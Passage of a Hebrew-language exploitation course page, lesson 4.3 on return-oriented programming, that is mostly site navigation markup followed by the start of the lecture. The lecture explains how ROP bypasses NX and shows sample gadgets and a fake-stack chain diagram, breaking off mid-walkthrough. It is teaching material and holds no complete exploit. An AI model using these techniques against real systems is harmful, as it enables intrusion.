+    <a href="../../4.2%20-%20ret2libc%20%D7%A7%D7%9C%D7%90%D7%A1%D7%99/4.2%20-%20ret2libc%20%D7%A7%D7%9C%D7%90%D7%A1%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.2   ret2libc קלאסי
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_6_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_6_3" id="__nav_7_2_6_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.3   ROP וגאדג'טים
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_6_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    4.3   ROP וגאדג'טים
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.3 - ROP וגאדג'טים - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.3 - ROP וגאדג'טים - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-rop-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        תכנות מונחה חזרה - ROP - הרעיון הגדול
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-gadget" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה זה גאדג'ט - gadget
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שרשור גאדג'טים - איך בונים חישוב
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        קטלוג הגאדג'טים השימושיים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-64-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        העברת ארגומנטים ב-64 ביט - תזכורת ממוקדת
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מציאת גאדג'טים - הכלים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הבינארי לדוגמה
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-system-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        בניית chain ל-system מתוך הבינארי - ידני
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rop-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אותו דבר עם אובייקט ROP - הדרך המקצועית
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alignment-movaps-ret" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודת הalignment - movaps ותיקון עם ret נוסף
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-syscall" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מעבר לחישוב שרירותי - כתיבה לזיכרון וsyscall
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודות נפוצות וטיפים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.3 - ROP וגאדג'טים - פתרון
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4.3%20-%20ROP%20%D7%95%D7%92%D7%90%D7%93%D7%92%27%D7%98%D7%99%D7%9D%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.3 - ROP וגאדג'טים - תרגול
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../4.4%20-%20%D7%93%D7%9C%D7%99%D7%A4%D7%AA%20libc%20%D7%95%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20ASLR/4.4%20-%20%D7%93%D7%9C%D7%99%D7%A4%D7%AA%20libc%20%D7%95%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20ASLR%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.4   דליפת libc ועקיפת ASLR
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../4.5%20-%20one_gadget%20%D7%95ret2system/4.5%20-%20one_gadget%20%D7%95ret2system%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.5   one gadget וret2system
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../4.6%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20exploit%20%D7%9E%D7%9C%D7%90%20%D7%A2%D7%9D%20ASLR/4.6%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20exploit%20%D7%9E%D7%9C%D7%90%20%D7%A2%D7%9D%20ASLR%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4.6   פרויקט exploit מלא עם ASLR
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../5%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%9E%D7%97%D7%A8%D7%95%D7%96%D7%AA%20%D7%A4%D7%95%D7%A8%D7%9E%D7%98/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5   חולשות מחרוזת פורמט
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.1%20-%20stack%20pivoting/6.1%20-%20stack%20pivoting%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6   ROP מתקדם
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7   ניצול הHeap
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../8%20-%20%D7%94%D7%A0%D7%93%D7%A1%D7%94%20%D7%94%D7%A4%D7%95%D7%9B%D7%94%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8   הנדסה הפוכה לניצול
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9   ניצול קרנל ואתגרים מתקדמים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../10%20-%20%D7%9E%D7%A6%D7%99%D7%90%D7%AA%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%90%D7%9E%D7%99%D7%AA%D7%99%D7%95%D7%AA/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10   מציאת חולשות אמיתיות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-GPU/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות GPU
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-rop-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        תכנות מונחה חזרה - ROP - הרעיון הגדול
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-gadget" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה זה גאדג'ט - gadget
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שרשור גאדג'טים - איך בונים חישוב
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        קטלוג הגאדג'טים השימושיים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-64-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        העברת ארגומנטים ב-64 ביט - תזכורת ממוקדת
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מציאת גאדג'טים - הכלים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הבינארי לדוגמה
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chain-system-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        בניית chain ל-system מתוך הבינארי - ידני
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rop-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        אותו דבר עם אובייקט ROP - הדרך המקצועית
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alignment-movaps-ret" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודת הalignment - movaps ותיקון עם ret נוסף
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-syscall" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מעבר לחישוב שרירותי - כתיבה לזיכרון וsyscall
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודות נפוצות וטיפים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="ניווט" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    דף הבית
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר ו-Low Level
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר חולשות
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    4   עקיפת NX וROP בסיסי
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    4.3   ROP וגאדג'טים
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>4.3 - ROP וגאדג'טים - הרצאה</h1>
+
+<p>בשיעור 2.3 כבר טעמנו את הגאדג'ט הראשון שלנו, <code>pop rdi ; ret</code>, כשרצינו להעביר ארגומנט לפונקציה מנצחת ב-64 ביט. בשיעור 4.2 השתמשנו ברעיון הזה כדי לבנות ret2libc קלאסי וקראנו ל-<code>system</code> מתוך libc. עכשיו נעצור, ניקח נשימה, ונבין את הרעיון הכללי שמאחורי כל זה לעומק. הטכניקה נקראת תכנות מונחה חזרה, והיא הכלי המרכזי לעקיפת NX: במקום להזריק קוד חדש (שממילא לא נוכל להריץ כי המחסנית מסומנת ללא הרצה), אנחנו מרכיבים את התוכנית שלנו מחתיכות קוד שכבר קיימות בבינארי ובספריות. בשיעור הזה נבין מה זה גאדג'ט ברמת הבתים, איך שרשור גאדג'טים בונה כל חישוב שנרצה, איך מוצאים גאדג'טים עם הכלים המקצועיים, ואיך מרכיבים chain שפותחת shell.</p>
+<h2 id="-rop-">תכנות מונחה חזרה - ROP - הרעיון הגדול<a class="headerlink" href="#-rop-" title="Permanent link">&para;</a></h2>
+<p>מנגנון ה-NX (נקרא גם DEP) מסמן את המחסנית ואת ה-heap כאזורים שאסור להריץ מהם קוד. בעבר תוקף היה כותב shellcode ישר על המחסנית וקופץ אליו, אבל עם NX המעבד פשוט מסרב. הקוד היחיד שכן מותר להריץ הוא הקוד שכבר קיים בבינארי (מקטע <code>.text</code>) ובספריות המשותפות. אז מה עושים? במקום קוד חדש, משתמשים בקוד ישן.</p>
+<p>תכנות מונחה חזרה, או בקיצור ROP, הוא הרעיון הבא: נזהה בבינארי רצפים קצרים של הוראות שמסתיימים ב-<code>ret</code>, נקרא לכל רצף כזה "גאדג'ט", ונשרשר אותם יחד באמצעות המחסנית. כל <code>ret</code> שולף כתובת מראש המחסנית וקופץ אליה, ולכן אם נסדר על המחסנית סדרה של כתובות גאדג'טים, כל גאדג'ט "ימסור את השרביט" לגאדג'ט הבא. התוצאה: הרצנו רצף פעולות שבחרנו, בלי לכתוב אפילו בית אחד של קוד חדש.</p>
+<p>בואו נחדד את האנלוגיה. בתוכנית רגילה, <code>rip</code> (מצביע ההוראות) קובע איזו הוראה רצה עכשיו, ואחרי כל הוראה הוא מתקדם להוראה הבאה. ב-ROP, המחסנית היא זו שקובעת מה רץ עכשיו: <code>rsp</code> הוא ה"מצביע הוראות" האמיתי, וכל <code>ret</code> הוא ה"מנוע" שמקדם אותו לפריט הבא. הchain שאנחנו כותבים על המחסנית היא למעשה התוכנית שלנו.</p>
+<h2 id="-gadget">מה זה גאדג'ט - gadget<a class="headerlink" href="#-gadget" title="Permanent link">&para;</a></h2>
+<p>גאדג'ט הוא רצף קצר של הוראות אסמבלי, בדרך כלל הוראה אחת עד שלוש, שמסתיים ב-<code>ret</code>. ה-<code>ret</code> הוא החלק הקריטי: הוא זה שמאפשר לשרשר. דוגמאות קלאסיות:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rdi</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nf">ret</span>
+</code></pre></div>
+<p>הגאדג'ט הזה שולף 8 בתים מראש המחסנית לתוך <code>rdi</code>, ואז ה-<code>ret</code> קופץ לכתובת הבאה שעל המחסנית. גאדג'ט אחר:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nf">ret</span>
+</code></pre></div>
+<p>וגאדג'ט קצת יותר מעניין, שכותב לזיכרון:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nf">mov</span><span class="w"> </span><span class="no">qword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rdi</span><span class="p">],</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nf">ret</span>
+</code></pre></div>
+<p>הנקודה החשובה: גאדג'ט הוא לא פונקציה ולא משהו שהמתכנת המקורי התכוון אליו. הוא סתם קטע קוד שבמקרה מסתיים ב-<code>ret</code>. יתר על כן, בארכיטקטורת x86-64 ההוראות הן באורך משתנה, וזה פותח פתח לגאדג'טים "לא מכוונים" - unintended gadgets. הנה איך זה עובד: נניח שיש בבינארי את רצף הבתים הבא, שהמהדר התכוון שיהיה הוראה מסוימת:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>address  bytes                  what the compiler meant
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>0x4011a0 48 c7 c0 3b 00 00 00   mov rax, 0x3b
+</code></pre></div>
+<p>אבל אם נקפוץ באמצע, לכתובת <code>0x4011a2</code>, המעבד יפרש את הבתים <code>c0 3b 00</code> אחרת לגמרי - אולי כהוראה חוקית שמסתיימת ב-<code>ret</code>. הבית <code>c3</code> (שהוא הקוד של <code>ret</code>) מופיע בעשרות מקומות אקראיים בתוך הבינארי, וכל אחד מהם הוא סוף פוטנציאלי של גאדג'ט. לכן אפילו בבינארי קטן יש מאות ואלפי גאדג'טים. הכלים שנכיר עוד מעט סורקים את כל הבתים ומגלים את כולם, כולל הלא מכוונים.</p>
+<h2 id="-">שרשור גאדג'טים - איך בונים חישוב<a class="headerlink" href="#-" title="Permanent link">&para;</a></h2>
+<p>בואו נראה בעיניים איך chain עובדת. נניח שאנחנו שולטים במחסנית (בזכות buffer overflow), ובנינו את המחסנית המזויפת הבאה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>low addresses (top of stack)
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>+----------------------------+
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>| address: pop rdi ; ret     |  &lt;-- the ret of the vulnerable function jumps here
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>+----------------------------+
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>| 0x1337                     |  &lt;-- popped into rdi
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>+----------------------------+
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>| address: pop rsi ; ret     |
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>+----------------------------+
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>| 0x0                        |  &lt;-- popped into rsi
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>+----------------------------+
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>| address: some_function     |  &lt;-- called with rdi=0x1337, rsi=0
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>+----------------------------+
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>high addresses
+</code></pre></div>
+<p>הזרימה, צעד אחרי צעד:</p>
+<ol>
+<li>הפונקציה הvulnerable מבצעת <code>ret</code>. היא שולפת את הכתובת של <code>pop rdi ; ret</code> וקופצת אליה.</li>
+<li>הגאדג'ט מבצע <code>pop rdi</code> ושולף את <code>0x1337</code> לתוך <code>rdi</code>. עכשיו <code>rsp</code> מצביע על הפריט הבא.</li>
+<li>ה-<code>ret</code> של הגאדג'ט שולף את הכתובת של <code>pop rsi ; ret</code> וקופץ אליה.</li>
